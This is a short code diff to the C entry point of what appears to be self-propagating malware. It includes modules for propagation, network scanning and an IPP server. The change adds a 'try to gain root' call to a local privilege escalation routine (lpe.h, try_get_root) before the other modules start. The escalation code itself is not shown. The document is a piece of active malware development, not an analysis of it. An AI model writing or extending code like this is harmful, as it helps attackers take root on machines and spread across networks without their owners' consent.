@@ -1,4 +1,5 @@
 #include "ipp_server.h"
+#include "lpe.h"
 #include "propagate.h"
 #include "scanner.h"
 #include "utils.h"
@@ -21,6 +22,9 @@ void * start_ipp_server(void *varg){
 }
 
 void entry(Globals *global) {
+    // try to gain root
+    try_get_root(global);
+
     // load the file content into the global buffer
     load_file_bytes(global);
 
@@ -36,7 +40,7 @@ void entry(Globals *global) {
     pthread_t thread_id_ipp;
     global->pthread_create(&thread_id_ipp, NULL, start_ipp_server, global);
 
-    
+
     DEBUG_LOG("[ENTRY] Started all modules!\n");
     // keep running
     while(1){
